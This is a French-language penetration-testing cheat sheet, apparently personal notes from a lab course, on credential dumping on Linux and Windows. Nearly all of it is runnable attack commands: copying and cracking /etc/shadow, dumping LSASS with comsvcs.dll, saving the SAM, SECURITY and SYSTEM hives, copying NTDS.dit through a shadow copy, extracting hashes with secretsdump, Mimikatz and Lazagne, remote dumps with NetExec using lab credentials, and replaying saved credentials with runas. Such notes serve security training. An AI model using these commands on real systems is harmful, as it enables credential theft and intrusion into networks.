

- [[#LINUX]]
- [[#WINDOWS]]

---
# LINUX

- [[#[Pluggable Authentication Modules](https //web.archive.org/web/20220622215926/http //www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html) (`PAM`)|PAM]]
- [[#Bruteforcer les hash (Root)]]

## [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html) (`PAM`)

### /etc/shadow (root)

stocke les hashs des mots de passes utilisateurs

```bash
sudo cat /etc/shadow
```
#### Shadow Format

Si un caractère tel que ! ou * se situe à l'endroit du hash, une autre méthode d'authentification est utilisée.

|`cry0l1t3`|`:`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`:`|`18937`|`:`|`0`|`:`|`99999`|`:`|`7`|`:`|`:`|`:`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Username||Encrypted password||Last PW change||Min. PW age||Max. PW age||Warning period|Inactivity period|Expiration date|Unused|

| **ID**   | **Cryptographic Hash Algorithm**                                      |
| -------- | --------------------------------------------------------------------- |
| `$1$`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `$2a$`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `$5$`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$6$`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$sha1$` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `$y$`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `$gy$`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `$7$`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |
### /etc/passwd

contient des informations sur les users présents sur le système et peut contenir le hash duu mot de passe sur d'anciens systèmes.

```bash
cat /etc/passwd
```
#### Passwd Format

|`cry0l1t3`|`:`|`x`|`:`|`1000`|`:`|`1000`|`:`|`cry0l1t3,,,`|`:`|`/home/cry0l1t3`|`:`|`/bin/bash`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Login name||Password info||UID||GUID||Full name/comments||Home directory||Shell|

### /etc/security/opasswd (root)

store les anciens mots de passe utilisateurs, séparés par une virgule

```shell
sudo cat /etc/security/opasswd
```


## Bruteforcer les hash (Root)

Copier les fichiers /etc/passwd et /etc/shadow

```shell
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak 
```

```shell
chmod 777 /tmp/passwd.bak
chmod 777 /tmp/shadow.bak 
```

Combiner les deux fichiers avec Unshadow

```shell
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

Bruteforce avec [[HASHCAT]]

```shell
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked
```

Bruteforce avec [[JTR]]

```bash
john --format=crypt /tmp/unshadowed.hashes
```



---

# WINDOWS

- [[#[Local Security Authority Subsystem Service](https //en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`)|LSASS]]
- [[#RUCHES]]
- [[#Extraction des ruches en local (nt authority/system)]]
- [[#Dump les hash des ruches avec Impacket secretsdump]]
- [[#Bruteforce avec HASHCAT]]
- [[#NTDS.dit]]
- [[#Exploitation en remote (admin local)]]
- [[#Dump avec MIMIKATZ]]
- [[#DPAPI]]

## [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`)

Processus qui gère les creds en mémoire

```
%SystemRoot%\System32\Lsass.exe
```

### Dump du processus LSASS (nt authority/system)

Récupérer l'id du processus
```powershell
Get-Process lsass
```

Dump avec comsvcs.dll (flag par les AV)
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <id> C:\lsass.dmp full
```

Exfiltrer le dump
[[DATA TRANSFER#UPLOADS Exfiltration]]

Extraire les hash avec pypykatz
```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```




## RUCHES 

- SAM -> C:\Windows\System32\config\SAM
- SECURITY -> C:\Windows\System32\config\SECURITY
- SYSTEM -> C:\Windows\System32\config\SYSTEM

### [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748\(v=ws.10\)?redirectedfrom=MSDN) (`SAM`) (HKLM\SAM)

Fichier de base de données qui stocke les hash des comptes locaux.

```
%SystemRoot%/system32/config/SAM
```


### Ruche SECURITY (HKLM\SECURITY)

Stocke les secrets LSA
- Mots de passe utilisateurs
- Mots de passe internet explorer
- Mots de passe des comptes de services
- Mots de passe des comptes pour les tâches planifiées
- Mots de passe des comptes de domaine mis en cache.

### Ruche SYSTEM (HKLM\SECURITY)

Contient la clé de chiffrement et déchiffrement de la base SAM et des secrets LSA.


## Extraction des ruches en local (nt authority/system)

```Powershell
reg save HKLM\SAM sam.reg
reg save HKLM\SYSTEM system.reg
reg save HKLM\SECURITY security.reg
```

ou dump directement avec Lazagne

```
.\Lazagne.exe all
```

bypass EDR

https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets

### Exfiltrer les ruches

[[DATA TRANSFER#UPLOADS Exfiltration]]



## Dump les hash des ruches avec Impacket secretsdump

```shell
sudo impacket-secretsdump -sam sam.reg -security security.reg -system system.reg LOCAL -outputfile host_hashes -user-status -history -pwd-last-set
```

## Bruteforce avec [[HASHCAT]]

```shell
hashcat -m 1000 host_hashes /usr/share/wordlists/rockyou.txt
```



## NTDS.dit

Base local qui stocke les identifiants sur un DC.

### Créer une shadow copy du volume C: 

```shell
vssadmin CREATE SHADOW /For=C:
```

### Copier NTDS.dit depuis la shadow copy

```shell
cmd.exe /c copy <shadow_copy_volume_name>\Windows\NTDS\NTDS.dit c:\NTDS.dit
```

### Extraction de la ruche SYSTEM

```Powershell
reg save HKLM\SYSTEM system.reg
```

### Exfiltrer la copie du NTDS.dit ainsi que la ruche system

[[DATA TRANSFER#UPLOADS Exfiltration]]


### Dump les hash de la base NTDS avec Impacket secretsdump

```shell
impacket-secretsdump -ntds NTDS.dit LOCAL -system system.reg -outputfile domain_hashes -user-status -history -pwd-last-set
```

### Bruteforce avec [[HASHCAT]]

```shell
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```


## Exploitation en remote (admin local)

Dump LSA avec Netexec

```shell
nxc smb 10.129.42.198 -u bob -p HTB_@cademy_stdnt! --lsa
```

Dump LSASS avec Netexec

```shell
nxc smb 10.129.42.198 -u bob -p HTB_@cademy_stdnt! -M lsassy
```

Dump SAM avec Netexec

```shell
nxc smb 10.129.42.198 -u bob -p HTB_@cademy_stdnt! --sam
```

Dump NTDS.dit avec Netexec

```shell
nxc smb 10.129.42.198 -u bob -p HTB_@cademy_stdnt! --ntds
```



## Dump avec MIMIKATZ

Dump LSA

```
privilege::debug
sekurlsa::logonpasswords
```

Dump SAM

```
privilege::debug
token::elevate
lsadump::sam
```



## DPAPI

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

## Credential Manager

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`


Enumérer les creds

```cmd
cmdkey /list
```

rejouer les creds avec runas

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

Possible d'exporter les vaults au format .crd en y mettant un mot de passe et les importer sur une autre machine windows.

```cmd-session
rundll32 keymgr.dll,KRShowKeyMgr
```

